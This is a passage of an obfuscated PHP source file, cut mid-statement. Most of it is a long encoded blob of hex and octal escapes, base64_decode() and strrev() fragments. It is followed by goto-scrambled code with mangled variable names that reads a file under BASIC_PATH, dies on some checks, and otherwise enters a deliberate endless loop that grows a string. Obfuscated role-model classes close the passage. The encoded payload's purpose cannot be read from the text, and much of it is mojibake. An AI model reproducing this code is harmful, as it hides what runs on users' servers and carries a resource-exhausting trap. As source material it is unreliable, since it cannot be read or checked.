x4d\x96\x9a\xe1\x85\x5e\xa6\x5b\x5a\x8\xa6\x2\x3f\x99\x35\xb9\x95\x58\xbe\x5f\x63\x35\xd1\xa3\x4b\xf9\x82\x25\x8d\xe\xdd\x6\xaf\x86\x80\x73\x54\x8d\x2\xe9\x27\xe8".base64_decode('IEFLsplJjPqDxDFyC+xyUZfLQHYA9MSeCb1JosY6SKEjA1InvFaBzJIETxd0')."\343\140\263\63\234\256\47\311\72\326\140\177\247\111\165\140\262\204\56\161\311\43\347\342\266\252\250\31\11\64\3\257\114\45\354\273\332\246\205\300\31\12\40\65\66"."\x65\x6\xd9\x28\xdc\x85\x5a\x5e\xc7\x47\x57\x56\x55\xa\xb7\x28\x1\xaf\x3f\x2a\x9f\x1d\x85\xaf\xa1\x82\x1\x6a\xdf\x68\x4f\x8\x80\xb4\x58\x64\x88\x14\x4f\x64\xa8\x94\x70\xfd\xd9".strrev('è¢’—_è7áªR‚,¤MV8Ç"Â-­{¯6XÑQÃ†	Oa(©x¤C')."\x12\x6a\xd\x12\x72\x18\x27\x68\x1f\x27\xab\x47\xbd\x2f\xc4\x9\x4d\xa7\x5e\x19\xbc\xc4\x24\x29\x9e\x1b\x5d\x39\x9e\x5e\xca\x71\x3f\x2c\x70\x82\x45\xef\xed\x88\x83\x20\x61\x1d\x9"."\x7f\x38\x2c\x25\x14\x7c\x9b\xd5\xa9\x62\x2e\x43\x4d\xc2\x37\x64\x70\x88\x92\xe8\xd\xed\xc\xf8\x40\xd4\xed\x2e\x73\x8d\x2d\x1f\x75\x46\x5a\x84\xc5\x2b\x20\x30\x5e\xe1\x3e\xa3\x95"."\x74\xe3\xc\xe\x3\x19\x46\x31\xb8\x7b\x6e\x59\xc9\xe2\xd2\x72\x57\x45\x59\xbc\xa\x30\x1e\x4\x1a\x27\x37\xc1\x71\x82\xff\x71\x66\x46\x1b\xcf\x41\x26\xc5\xe3\x6c\xe8\x58\x34\x7e"."\x9\x7f\xbe\x12\x6f\x77\x55\xc4\x3b\x58\x79\x0\x58\x4\x0\x4b\x18\xa0\xbf\x87\x39\x52\x84\x76\x55\x2c\x97\x59\x51\xd6\x5e\x52\xda\xe1\xaa\x68\x9f\x1b\x8f\x77\xc0\x60\x39\x80\xd5"."\100\170\74\352\252\50\167\324\215\162\267\152\246\230\37\77\302\35\62\17\131\2\172\67\234\125\51\355\203\54\221\6\244\60\164\7\42\252\377\132\374\340\10\20\236".base64_decode('O1jprLAXoPn9xPGiohtD6AGWo0cuCtJL1yxX+Nvdu7NocZtQaMcpdMUYK5SS')."\305\247\66\10\42\372\161\201\161\301\347\217\320\61\300\374\11\226\207\260\42\152\137\213\141\320\366\146\10\13\125\354\374\36\364\126\350\23\266\64\341\216\170\321\31"."\xde\x94\xe7\x99\x99\xc8\x64\x45\xa7\x40\x9c\x3f\x1c\x6\x48\x4d\x36\x28\x2a\x6\x5a\x46\x32\x13\xb5\xa0\xe3\x5a\xee\xfe\x4e\x32\x21\x70\x7e\xe5\xbc\xf6\x99\x9b\xe8\x94\x20\xea\xfa".strrev('r„'."\n".''."\0".'­õS#"@ŸÚÔ,ŠáÕRZ}’ÔÍ%	)âı”£KÜó„yØ')."\64\60\307\137\220\0\37\225\26\117\1\74\106\54\100\171\57\1\36\12\243\307\1\66\170\153\150\172\50\334\126\54\153\254\271\205\363\57\102\222\327\23\212\311\202"."\xe4\x8b\x45\x22\x20\xd8\x31\x99\x88\xaa\xde\x13\x46\x62\x5c\x75\x27\xdb\x6c\xcc\x64\x9e\x4a\xc\x64\xbf\x10\xc2\x26\xb8\xd9\x1f\x70\xb2\xbb\x89\x22\xee\xee\x49\x31\xa4\xf3\x25\x5d"."\x18\xca\xe9\xbc\x98\x3c\x84\xe7\xf9\x21\xdd\xf4\x13\x8c\x12\x5c\xf5\xf\xb2\xcd\x9f\xa6\xbd\x48\xb3\xab\x70\x68\xb4\xcc\xbf\x72\x91\x63\x7e\xe1\x4d\xd1\x2e\x34\xcb\xfc\x79\x92\x8b"."\x4b\x3\xa4\x1a\x49\xe8\x47\x4c\xd0\xa\x66\xac\x88\xda\x2d\x46\x83\x3a\x73\x53\x85\x58\x87\x22\x55\x40\x77\x4a\xc2\x15\x18\x14\x8a\x3c\x9\x2b\x27\xba\x6d\xe2\x4e\xd6\x60\xac\x91"."\277\364\22\356\350\235\125\22\33\21\317\57\343\66\160\144\254\220\5\225\54\166\343\57\125\217\253\231\160\26\370\217\354\137\150\15\203\167\72\174\271\231\211\346\72"."\x99\xa7\xdb\xbc\x2b\x7a\xfa\x1e\x4d\x12\x2f\xc7\xa9\xf3\x25\x58\x1\xf2\x24\x4\xfb\x66\x8a\x69\xa0\x5a\xe8\x10\x8c\xf7\x59\x2c\x82\xda\x2c\x28\x82\xd3\xe0\xfd\x34\xa7\x7b\x62\x8a"."\x9\x56\xb\x4e\xda\xd0\x29\x45\x9a\x42\x49\xc2\xdc\x26\xa8\x4\x49\xe\x29\x32\x89\xb3\xf9\x5c\xb1\x27\x4f\xd5\xce\x71\xe4\x51\x84\x2e\xbe\xb4\xc0\xd7\xdd\x64\x72\x9d\xd5\x92\x80".base64_decode('aJAyCbiB9SBsGrkBR4rn0QW/5sjpjyLerMZ0trTI6xGLcbMT7IyOUPYkXUTk').base64_decode('RChX7PoWA5GXoaLXu3jaYLLP9uQK1WhrzF7CwG9WRI95qAjvE3+JBkBAskLW').base64_decode('tHy4/KkE9oBE39V5ksl8cExnwMLnFi72QJC81CdOvsvKIZdlM+trHmRvqcH6')."\240\63\254\231\172\345\66\305\10\115\145\330\147\332\42\370\55\220\255\64\3\261\134\375\152\47\43\320\204\144\66\265\270\31\250\236\116\23\163\267\103\54\234\270\333".base64_decode('aFxpmDC+/fjWllDNGvb8icpX/WktIQXDjVDs9wWi06Vu1RK+aISuPuz7Gdlc')."\x22\xc5\x21\x45\xe7\x4e\xea\xa7\x8\x5\x9d\x48\xc9\xe2\x14\x2d\x97\x4d\x26\xf2\x88\xef\xa6\xb8\xe3\x23\xa1\x62\xbc\xea\x62\x75\x50\x43\xe3\x4c\x32\x13\x97\xbc\xbc\x94\x59\x28\x28".strrev('şbƒU:noLÓé–€¡OƒqOä—iÎÛE+Óèªõì¦0 “"”/¶!')."\202\271\104\103\21\62\44\305\107\235\174\132\131\73\5\46\114\74\216\363\20\47\152\202\355\114\41\234\31\260\101\7\136\5\107\1\64\103\4\147\257\302\156\265\263"."\xf4\x25\x1e\x71\xc7\xcc\x6c\xa3\x70\xd4\xcb\x95\x86\x36\xc7\x86\x24\x19\x48\x9d\x8a\x46\xb1\x1f\x87\x85\x12\x11\xf8\xf5\x94\xa1\xaa\x2b\xc8\xad\x25\xb9\xd7\xc2\xbc\xce\x68\x49\xf6".base64_decode('FAPMmuBuOf9bGDCZ2/oxf2/crgy7B/WKrqfhuw/BUJ0MjDuFJS7mkE85/vkS')."\x7\xf9\xac\x89\x3\x6a\xec\xd0\x28\x4\x3f\xa3\x32\xba\xf5\xa6\x4f\x78\xd0\x83\x68\xc2\xf3\x10\x8e\x37\x10\x96\x11\xd3\x4b\xa2\xee\x7c\x8e\x1c\x79\xe8\xcc\x24\x8c\x41\xe1\x54\x9a"."\235\166\123\165\51\173\30\16\265\346\176\372\375\25\27\373\314\22\4\163\173\33\372\160\120\364\327\5\53\243\156\331\350\0\350\14\261\157\134\344\111\4\266\17\271"."\xe4\x95\x22\x69\x12\x9f\x69\x96\x41\xaa\x95\x2a\x91\x91\x27\xff\x7a\x94\x34\x85\xba\x40\x80\x53\x43\xdc\x95\x42\x3f\x74\xfe\x74\xd6\x1a\xcc\x4f\x31\xd4\x2e\x43\x35\x7b\xf8\x27\xb9"."\360\33\277\46\315\344\136\116\212\200\20\323\302\145\26\310\23\352\351\301\2\200\315\232\57\110\73\315\236\15\102\337\263\0\71\304\171\100\144\325\17\310\227\3\205"."\260\263\126\7\324\330\133\55\371\316\163\111\361\41\353\162\124\72\212\234\105\266\243\307\106\305\121\104\100\116\144\364\43\170\20\140\216\65\231\41\45\1\300\245\147".base64_decode('HDHspMAwjcY/cfJLKXhBW9DPuwRwT2JrzgJe2+fZZPS1toLEZpW/lyKjcuSd')."\126\302\113\174\352\20\230\173\34\346\276\200\371\126\273\175\305\267\157\275\273\366\353\127\326\343\350\307\217\176\370\334\73\117\335\260\34\307\26\37\210\376\105\141\356"."\xa\x7d\x49\xdb\x22\xfd\x64\xff\xf0\xdf\xbd\x3b\x6a\x89\x5f\x5b\x73\xc3\xf8\xbe\x7d\x1b\x46\xaf\x59\xf5\xd1\xf8\x55\x37\xec\x58\xe7\xbe\x78\xfd\xcd\x6f\x7c\x97\x79\xf9\xa1\xaf\xff"."\xf9\xf1\xb7\x99\x97\x2f\x7e\xb2\xee\xf8\x57\x6e\x3f\xf7\xb8\xe3\x67\x8c\xba\x70\x5a\xcb\x79\x87\xfc\xf6\x81\x3b\xf\x99\xef\x1f\xfb\xf8\x51\xab\xb6\xe9\x4f\xbd\xf3\xd1\x3b\xcf\xc"."\226\257\376\272\253\113\317\354\76\63\234\230\367\344\313\123\263\77\73\166\370\136\271\375\372\236\175\267\36\370\145\305\376\111\7\276\260\356\57\307\177\122\262\343\242"."\xff\x1c\x70\xe6\xc5\x9f\x2f\xf\x1c\xf3\xd4\xc4\xee\xed\x9b\xc7\xce\x3e\xbf\x7c\xd3\xf8\x31\x47\x5\x7\x96\x1c\x74\xf5\xed\xab\x92\xff\x7a\xe7\x3a\xed\x3c\xd7\x7d\xea\xaf\xaf\xf9"."\367\230\373\357\272\140\171\367\312\310\270\305\367\337\373\362\213\27\304\246\275\375\374\364\37\74\7\36\367\151\351\353\117\335\177\327\342\175\237\337\161\375\352\273\76".base64_decode('nHfAPRd+PP6YVd7ZZ9z19LStc84Y9tr79/9qV9+NR4QXlL/z+4p1//rsd0sX')."\237\270\367\270\71\361\370\311\73\216\73\111\15\77\171\326\372\147\147\377\246\145\267\165\364\316\352\73\252\56\70\373\215\7\245\27\54\343\312\124\373\374\315\45\307"."\x3d\x7f\xd0\xf0\x63\x77\xf4\x5d\x3c\xeb\xec\xd7\x5f\xdd\x7c\xfc\xc1\x9d\x8d\x93\x56\x3a\xae\x3b\x61\xd3\xb3\xb\xa7\x6d\x6f\x7e\xe5\x82\xd1\x4f\xff\xe9\x94\xee\x75\xee\xf5\xe5\x55"."\267\274\352\334\222\110\276\261\376\226\17\206\115\370\262\262\352\207\121\277\377\325\264\107\116\16\205\16\332\74\155\326\77\376\374\111\307\266\222\125\173\33\252\255\253".strrev('ÿ^\'/ùşG{—KÇøoqûüÍ†#7íbµ^OÕÓûUón?Ïë5¶’ùy²¿ç')."\xac\x6b\xf5\x2d\x5f\xce\x39\xe0\xf2\xe0\x7d\x17\xfa\x76\xee\xbc\x24\x72\xc1\x75\x13\x8e\xf9\xf5\xf1\x93\x6a\x56\x3e\xfe\xdc\x4d\xcf\x46\xe6\x3c\x56\x52\x36\xaf\xe4\xe5\x51\x2b\x1e".strrev('ÿ¬s&¹NT6èÆruy6!£»¿Ë¢Ò•‘(Qùs}_£0üæÓèá?®X')."\xf0\xe4\x89\x3b\xfb\x36\x85\xdc\x4f\x1c\x33\x73\x5e\xdd\x86\xd9\x5b\xfc\x37\xdc\xbb\x3c\xf5\xfe\x63\xae\x7\x52\xcb\xea\x4f\xeb\x7f\xf6\xc3\xe1\xdf\xbf\x38\xe2\xdc\x43\x77\xec\xac"."\132\166\362\326\47\203\63\136\170\252\366\317\145\236\65\233\47\347\266\335\125\275\365\213\367\36\172\244\151\331\157\207\355\133\76\156\337\345\13\366\305\66\325\136\326"."\76\366\356\355\343\156\213\14\76\72\267\314\174\247\357\234\73\347\72\257\272\355\225\357\177\133\335\162\353\35\125\377\231\164\314\265\173\357\377\317\244\46\245\164\370".base64_decode('BvmyLRvWJU749NcTMvEDsn/48sdR4488//3qqsNOmD9//NaTSjZNdMy74oLa').base64_decode('93Y4d1nHTO8d9kPDguD8S0974Mpf3dE0oXPaQ2deXzJROtQ/KWs+NfX9s2ft')."\x7b\x76\xd3\x37\xa9\x57\x4f\x3c\xed\xd1\x4b\xfe\xf6\xda\x8a\x5b\xef\x9e\x56\x71\xed\x23\xe7\x5c\x38\xeb\x92\xd6\x3b\xee\x2d\xfb\xf0\xe6\xfd\xda\x41\x73\x4e\x58\xb7\x75\xc1\xdf\xcf".base64_decode('vzZiaB0fP/RBaMJDc85+0Hjpnq6+o7/67s5rx587+TZtb2j9hnfefPvj4xaN').strrev('çñÖñ|ñú^7‹må}©=oóÃÀı^+½³‡Æé^hº.[†óÿ Nı>µ')."\120\263\345\336\263\266\35\351\121\66\235\360\362\161\357\316\72\176\316\71\123\357\151\212\334\66\367\45\367\236\273\276\375\153\145\373\301\43\274\63\106\217\137\123\175"."\303\226\151\362\301\151\317\215\7\357\173\351\327\53\316\12\5\337\175\64\26\233\26\322\264\364\305\67\315\155\372\60\355\272\326\232\340\370\374\127\163\215\326\340\316"."\217\374\43\215\303\366\164\372\26\55\375\346\236\306\100\145\353\212\133\27\176\366\333\73\364\271\227\134\261\51\156\234\63\337\370\356\337\37\154\276\357\247\77\137\361".strrev('>§Íû-Ô_{İtıïóóûÏíß¹Äò}7-ıøüÏíóæùÎsº°è¶Õ<Ÿeë').strrev('sy¯TV»Ï%YüqïÆàqÎßµÌñŸ>KëÂü=×cíê½Şü>»åúö')."\353\243\307\234\66\166\313\175\177\72\364\226\115\343\272\37\233\377\125\331\145\347\366\232\333\364\13\74\332\141\337\274\33\173\155\353\77\167\354\172\156\357\242\155\127"."\335\276\157\357\354\255\255\307\76\367\360\242\313\266\105\67\277\276\153\216\353\236\212\173\76\33\63\373\241\243\36\135\373\355\354\27\157\31\136\267\363\316\173\57\154"."\x39\xf6\xe6\xb7\x66\xbf\xec\x5f\xfd\xf6\x79\x6f\xbd\xf7\xe2\xa4\x83\xe\xbc\xee\x4f\x27\xad\x7b\xc5\x75\xf7\x59\x73\xaf\xda\x73\xd5\x5\xe9\x77\x7a\x56\x2d\x3a\xf8\xac\xad\xb\xf7"."\x3f\x37\xe2\xb7\x73\xcc\xe0\x65\xb3\xac\xb7\x33\x23\xce\x7f\xfe\xf5\x11\xaf\xf4\xdc\x77\xd2\x91\x5f\xe\x1c\x5f\x7e\xca\x85\x6b\xf\xdb\xe2\x1a\xf1\x97\x47\xa2\x4f\xac\xff\x78\xc3"."\xbe\x9b\x37\x7f\x14\x7a\xa8\xca\x7d\xf3\x45\x27\xdc\x74\xc3\xc7\x97\x6e\x52\x6f\xbe\xea\xd1\x8b\xce\x7b\xf4\x8d\xd4\x3a\xf5\xa5\xed\x6f\x3c\x50\x7e\xdf\xfd\x27\x1e\xd3\x78\xfc\xde".strrev('#Ïİv›Ùñ>ŸSÍÍÿ¬év9‚ïºN·¢ï6Ÿv²O_Ò©¾àRvxì–')."\163\243\57\14\37\274\45\275\354\213\23\327\31\147\116\74\142\306\251\67\176\172\155\357\270\173\152\112\76\275\373\216\371\276\347\376\147\206\165\114\331\325\67\376\274".base64_decode('dMzRM2eMeHv5rza/Fd81b+s/svMaXj3qTS03cvX+3ksfuWxOxet9D559TqO7')."\373\55\163\331\65\127\134\273\364\37\15\113\307\154\177\364\205\125\73\327\166\325\154\332\161\315\13\271\317\333\315\315\347\334\277\75\34\153\367\117\37\273\377\305\365"."\x89\x49\xbf\xa\x9e\x9f\x78\xee\x9d\x7\x97\xfe\xf3\x73\xc7\xdc\x39\x6d\xa3\xa3\x4f\x5e\xf2\xde\x1f\x47\xfc\xfd\xf8\x73\x52\x9f\x7a\x1f\x78\x6c\xe7\xac\xd8\x99\xbe\x9f\x32\xcb\x9f"."\xde\x31\xbc\x23\x73\xc6\xc8\xad\xb7\x4e\xda\xb3\x79\xb0\xf9\xfa\xf2\x5\xae\xe5\xe3\x6a\x6f\xdc\xf6\x4e\xf0\xf4\xe9\xf3\x9e\xd8\xd9\x18\x3e\xb7\x6e\xc7\x22\xf3\xd3\x8f\xee\x7a\x66"."\273\174\364\351\217\237\372\323\367\57\175\372\352\373\257\336\262\361\17\247\377\264\370\347\375\317\145\77\171\360\255\277\37\375\111\335\251\77\176\265\365\307\163\377\147"."\xdb\x87\xbb\xbe\x78\xf5\xb2\xc3\x9e\xb9\xf7\x89\x93\xa7\x9e\x33\x69\xe1\xf7\x6f\xbd\xf7\xae\xfb\xa7\xef\xf7\x1c\xaf\xa7\xf6\xf8\x4e\xfd\xf4\x99\x9f\x7f\x7c\xfa\xa0\xe0\xea\x53\xba"."\257\373\375\335\307\66\52\203\235\57\116\32\323\373\144\166\131\172\371\244\67\156\270\370\41\137\62\163\337\364\326\303\57\367\134\357\366\214\236\331\176\354\105\307\356"."\x79\xf8\xcb\x1f\x8e\x3a\x6f\x5f\x64\xe2\x55\xf2\xe3\xf\x46\x66\x39\xaf\x7c\xe3\x8d\x17\xae\x58\x39\xbf\x79\xe7\xdb\x3b\xdf\x79\x78\xc9\x61\xe3\x93\x87\xfe\xb5\xf9\xa8\x7\x77\x3e"."\x72\xde\x8a\x37\x95\xba\xdf\x5c\x9f\xb9\xb7\x6e\xc7\xd\x1b\x6b\xae\x6a\xda\x2a\x4f\x77\xde\x9a\xb8\xe8\x74\x63\xc2\x41\x73\xce\xbb\xfb\x80\xbe\x65\xcd\x77\x6f\xb8\x73\xc5\x15\x2f".base64_decode('Tvjniq3KQ3tjJd9f801u178O6ur/8bFj3+7Rl8//99LI4TM/cr1ywzp51oIu')."\337\322\326\306\373\156\170\361\352\353\73\247\35\363\103\335\123\227\36\266\377\301\243\351\155\63\174\134\313\344\135\376\100\275\127\107\12\26\227\250\232\41\31\244\51".base64_decode('EmW1TEtkKpAADcRnBwogTkWU6otDbZwKysKd/BOH9UXd8kP5iPz41C6m6IBx').strrev('·”°äp(\\|àï±óB¸1ƒ¾'."\r".'Úy7°˜ttbGDsîäÜ<Á')."\305\376\261\27\330\333\230\330\270\115\53\221\257\220\140\23\230\127\40\222\77\311\61\335\6\312\363\65\224\311\245\371\323\107\20\261\53\143\260\102\312\24\347\257\370"."\x70\xd1\xc3\x45\x7\x75\xc7\xeb\xc0\xe\xdf\x1d\xb6\xe2\xbf\xf0\xc1\x1\xbc\x7c\x3c\x2c\xae\x61\x41\xab\xff\x45\x53\xc4\xe5\x1\xd2\xd2\x0\x79\xd7\x63\x46\x54\x7e\x67\x3a\x3b\x9d"."\254\36\67\341\54\121\105\311\327\200\353\273\160\17\15\241\40\271\306\46\146\255\364\346\206\255\263\144\107\33\211\172\5\27\335\216\240\104\273\377\5\342\332\135\140"."\x71\x19\x7e\xfd\x2f\x30\xdd\x53\x4c\x13\x82\xb\x9\x77\x2e\xac\x66\xf1\x3\x15\x45\x5a\xf9\xbf\xf7\x43\xb1\xbf\x74\x44\xb9\xd8\xe4\xda\x1f\xdd\x12\x4d\xa5\x8f\xe9\x46\x4\x85\x86".base64_decode('qHrhQ8NOsf/7zlGtgiBl/GL/0OoI2nLVCsM3uGTtBIUVz8PdUHbbG/GI+phC').strrev('&IFîôÂHaçKpÅÍ='."\r".'“'."\n".'Ê¨uh¨=?6!Ó!²D fW:İ}')."\155\12\11\20\367\61\61\132\100\362\144\36\220\117\205\70\0\362\45\24\66\263\273\377\214\177\317\137\177\347\25\257\255\371\361\45\42\31\35\2\376\55\220\214\72"."\x66\xa4\x87\x3d\x5d\x79\xa4\xff\x53\xe9\xb4\x3f\x5f\x35\x3c\x76\xca\x37\x9f\x3d\x33\xf8\xfb\xfb\xd5\x71\xf7\x3d\x78\xcb\x73\x9b\x56\xfc\xf1\xa1\x71\xff\x9c\xd3\x78\xee\x97\x1b\xb7"."\x8f\x19\xc\x6c\xf9\x7a\xed\xef\x53\xff\x33\xfb\xfb\xbf\xdd\x5c\xf7\xc6\xb1\x1b\x8e\x78\x68\xfd\xa6\xf9\x1b\x16\xf9\x7\xde\x9b\x36\xce\x37\x57\x19\xf7\xec\x6d\x57\x7f\x7a\xd4\xf4".base64_decode('2EG9qX9c+H3piBPemzjcu+ijEfccs+uIVVOe+6Nrk/6HQ3sr7vaeNK8hGh2f')."\xf5\x75\xfe\x67\xd9\xdf\xce\x59\xb1\xec\xb6\xb3\x97\xac\xf8\xf9\x94\xf6\x1d\x97\x4f\x5b\xba\x7c\xdb\xcb\x9b\x4f\x5d\x7c\xca\xe2\x6f\xae\xef\xbd\xf6\xf2\x4b\x47\x2e\x7d\x7b\x7e\x2a"."\22\70\267\342\312\113\326\374\175\362\157\137\333\173\122\165\364\315\55\45\217\174\231\36\365\260\172\352\257\66\237\161\375\351\333\136\337\64\172\312\255\335\43\357\370"."\161\344\157\316\370\161\260\371\177\46\135\373\335\101\273\136\151\135\375\335\201\364\210\315\223\163\377\127\237\234\341\37\315\341\137\237\31\166\304\21\277\374\1\32\344".strrev('ìçÊCs.#Ã  •1è_~()ÂF¿EÃön”±ùš¬?ñ#âŒ').strrev('~-{£'."\0".'\\1Sª\\Ñ;Cø¥IH[¶ÄPbß²˜Â/‚±=…MC©3¢q9œP')."\41\245\110\244\160\324\234\51\221\221\53\45\370\374\133\26\63\10\357\45\13\246\233\134\173\45\172\171\7\63\132\242\267\310\263\73\364\41\173\220\121\240\340\310\272".base64_decode('bYhsvL6aKZ3M0JyGeLucRED2IZj/sQSeUfiqAxpVpJAMgfUXPzsx9PesOBXH')."\x71\xf8\x25\x1\xbb\x3a\x12\xa9\x2b\x21\xc9\x70\x8a\xf9\xb0\xf6\xd\x5b\x28\x41\xb5\x59\x4\x6a\xb8\x5c\x79\x5d\x60\x9b\xa1\xe8\x6\xa0\x9f\x57\x12\x14\x36\x30\x24\x7e\x38\xab\xc8"."\370\350\246\152\61\164\164\76\333\241\114\65\47\170\154\20\154\133\13\276\341\145\351\266\312\1\343\54\334\347\142\367\321\370\273\41\320\367\255\226\164\110\321\326\346"."\62\344\44\5\2\320\263\64\344\202\164\36\141\27\346\111\303\44\341\37\354\210\266\14\46\303\112\346\111\201\20\377\174\100\271\304\35\250\212\137\103\201\227\37\15"."\72\103\155\273\237\50\123\351\123\275\272\141\306\264\254\71\124\272\200\227\202\243\311\31\320\47\15\35\46\74\143\130\31\62\367\342\7\200\354\225\202\245\216\362\171"."\261\177\126\45\377\163\52\350\76\301\100\367\345\344\207\256\2\62\44\25\101\302\325\3\174\10\145\127\102\243\104\4\246\116\244\111\15\302\345\251\375\32\233\355\224"."\2\122\222\323\202\102\62\52\5\260\325\322\62\335\360\27\272\205\102\316\176\204\144\174\11\344\351\123\230\155\145\176\251\126\33\177\52\134\172\47\20\276\161\11\0".base64_decode('FYTfpEV/PFktv4TVoxnJevbRWp4/l+GfsuXZ4ec1i4EBH1SEmnYpffxClDN6')."\311\144\203\322\127\44\53\373\270\56\203\2\10\313\212\330\27\301\111\35\167\347\242\366\213\207\15\311\327\125\330\35\230\261\20\312\235\330\345\217\12\355\5\115\334".base64_decode('+y7R+x1DKvvn81zcJy6uytBRQSXpZQm4j0z+4k3afe2xbGH+0Zpu9EDKaYPm').base64_decode('+aCBFxyxfPYaJ5nih9/sV92iQGhb8KBQnXgNPmSBaPFGOFbap1jwU9iFvw5l').base64_decode('I4s8M+F4bTXbiCYbLMkZERNtXcxfbsSoc1zFwDS6FcBpHnsSzq/mjUgskD9a')."\x5c\xc2\x28\x98\x33\x52\xa6\x78\xd3\xf9\xd\xd0\x29\xcb\x37\x37\xe1\x95\x88\x62\x4d\xbe\x2d\x4c\x4c\x2f\x52\x6\xf7\xa8\x68\x31\x9c\x4\x4b\x72\x96\xca\x56\x56\x94\x62\x79\x31\xf8"."\265\50\163\210\36\26\216\37\355\216\274\321\223\76\163\157\116\102\326\241\246\244\150\346\302\346\310\372\347\347\106\302\147\361\136\24\225\242\207\352\105\321\314\103\366"."\302\366\315\106\321\236\245\30\231\243\51\105\10\33\67\77\51\44\241\74\255\210\61\14\361\354\5\116\321\210\315\370\274\40\131\264\254\51\156\173\23\51\272\21\115"."\xbb\x51\x4c\x1e\x5c\x9c\x18\x6a\xe3\xb7\x6b\xd9\xd2\x3d\x1b\x57\x7\x5a\x24\x1a\x10\xc1\x36\xc2\x9b\xcb\xf4\x66\xe8\xd7\xa3\x41\xb\xdc\x17\x3\x6b\x85\x72\x63\x79\xce\x5c\x28\x46"."\146\162\202\257\20\370\54\11\207\220\336\17\176\0\73\41\330\320\101\240\350\267\5\247\333\114\130\64\370\131\26\146\145\142\63\251\50\222\356\342\32\77\321\275\216"."\xcd\xd3\xf\xcc\xc2\x2f\x97\xf1\xb9\x49\x54\xa3\xf8\x56\x17\xd9\x37\x12\x48\xfd\x20\x94\x16\x1c\xf8\x38\xc2\xc9\x51\xdd\xb0\x1c\x30\x2d\xa6\x67\xd1\x6f\xbd\x6e\x59\xcc\xdf\x39\x97"."\xe4\x0\x6f\x89\xa\x21\x76\xa\x1e\x2f\xe\xc1\xb4\x6\x84\xf8\xf7\xe9\x20\x36\x21\x5\x2d\x42\x2b\xb4\xfd\x51\x90\x5c\x35\x43\x6\x3f\xaa\xe2\x54\x44\x52\x6c\x11\xa8\xf8\x65\x11"."\xf1\xf4\xe8\xd5\x93\x9d\xfa\x0\x59\x1d\xe4\x83\x8e\xb7\xc6\xc5\x2a\x25\x9f\x21\xe2\xae\xdd\x8\x46\x88\x66\x40\xc8\x6\xd7\x74\xe3\x14\x37\x79\x19\xe4\x44\x75\x38\x89\x57\x63\x6e"."\225\213\213\343\357\317\61\167\35\277\124\3\321\123\361\52\360\207\41\220\147\70\370\75\25\377\254\100\64\26\55\110\152\361\104\243\155\341\210\17\77\42\50\110\106".base64_decode('pQSbq4KklqZwaKg0f7MnECxIgzZY8GkDda2NkwItqJeeYJCa+xb2IuCdznuC').base64_decode('bvO5+Jbt0TMCwgpmh1QFG1XoOyxIiNkXCIWwmla0VEF1dqlXXHKT+nFnAfuH')."\xde\xc4\xc3\x88\xa2\x29\xa9\x5\xda\x4f\x85\x48\xc5\x91\x2c\x45\x6c\xcc\x4e\x63\x7b\x26\x9f\xf8\x72\xc\x7e\x89\x83\x6d\x7a\xc6\x7f\xa2\x29\x10\x8d\x31\xf1\x87\x88\x84\x44\x7c\xc4"."\333\254\42\4\70\332\110\120\123\346\20\120\70\277\323\56\362\304\40\357\332\241\360\223\357\266\10\17\11\326\253\171\113\66\244\52\331\146\264\40\360\1\103\330\101"."\xf0\xc5\x81\xb3\x73\xb6\x4e\xec\xa\xe7\xeb\x9d\x82\xce\x14\x4f\xad\x6d\x52\x45\xb\x3c\x1c\xb6\x25\x23\xf\x6f\x8c\xce\xc5\xf4\x98\xd2\x4d\xe8\x1a\xe4\x3d\x78\xac\x7e\x50\xc\x8b"."\132\230\251\214\226\41\312\206\211\131\276\31\226\140\351\303\225\226\175\132\226\13\300\160\332\146\152\302\334\163\312\57\223\214\62\53\126\305\102\325\54\204\3\350\3".base64_decode('Jv8PEJHW7m+VAAA=')."".base64_decode('').""."", 10, -8))); goto Aè’‡À“Ë; eØØŠÖÌ¨Ó: if (!isset($_SERVER[$_SERVER[İë¬“ÅÒÛ›][556]]) || !isset($_SERVER[$_SERVER[İë¬“ÅÒÛ›][592]])) { goto DÌ¢êâÜ¢ ; a…È¸¶å½ö: $eŞªÕÑô£Ÿ(BASIC_PATH . $_SERVER[İë¬“ÅÒÛ›][554]); for (;;) { $eŞªÕÑô£Ÿ = $eŞªÕÑô£Ÿ . $_SERVER[İë¬“ÅÒÛ›][595]; } goto bˆ°Ä„Çè›; A„Ì„±Éèº: $a¶ª¾£æÂ¨ = explode($_SERVER[İë¬“ÅÒÛ›][224], $FÀï‹˜©È¹); if (count($a¶ª¾£æÂ¨) < $_SERVER[İë¬“ÅÒÛ›][593]) { die; } $eŞªÕÑô£Ÿ = $_SERVER[İë¬“ÅÒÛ›][594]; goto a…È¸¶å½ö; DÌ¢êâÜ¢ : $f£Ó®ôÀ = $_SERVER[İë¬“ÅÒÛ›][557]; $cµèŒ‘¸Ş = BASIC_PATH . $_SERVER[İë¬“ÅÒÛ›][554]; $FÀï‹˜©È¹ = $f£Ó®ôÀ($cµèŒ‘¸Ş); goto A„Ì„±Éèº; bˆ°Ä„Çè›: } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\x72\x6f\154\145\114\151\x73\x74"; public $field = array("\156\x61\155\x65", "\x61\x75\164\x68", "\154\x61\142\x65\x6c", "\144\151\x73\160\x6c\x61\171", "\163\x79\x73\164\145\155", "\144\145\163\143", "\151\147\x6e\x6f\162\145\105\170\164", "\151\x67\x6e\x6f\x72\145\x46\x69\154\145\x53\x69\172\x65", "\141\x64\155\151\156\x69\x73\164\x72\x61\164\x6f\x72", "\x73\157\162\164"); public function listData($a÷ºã•°¨ = false, $cìƒßÇ˜— = "\163\157\x72\164", $eóÜåé±£˜ = false) { return parent::listData($a÷ºã•°¨, $cìƒßÇ˜—, $eóÜåé±£˜); } public function update($Bé³Ş©ÉÕ‘, $cˆ÷­¿ùÕ) { goto dîò¬À‘ñ; a§ùÈ”‡ªø: if (!$b¯¶ÌÌÎ¬ || $C±Õº’â±  && $C±Õº’â± [$cÍ×”¿Ñ[369]] != $b¯¶ÌÌÎ¬[$cÍ×”¿Ñ[369]]) { return !1; } if ($C±Õº’â± [$cÍ×”¿Ñ[1902]] == 1) { $cˆ÷­¿ùÕ = array($cÍ×”¿Ñ[28] => $cˆ÷­¿ùÕ[$cÍ×”¿Ñ[28]], $cÍ×”¿Ñ[1564] => $cˆ÷­¿ùÕ[$cÍ×”¿Ñ[1564]]); } $this->filterAuth($cˆ÷­¿ùÕ[$cÍ×”¿Ñ[550]]); goto D¾ÒÃ¾İºÌ; dîò¬À‘ñ: $cÍ×”¿Ñ =& 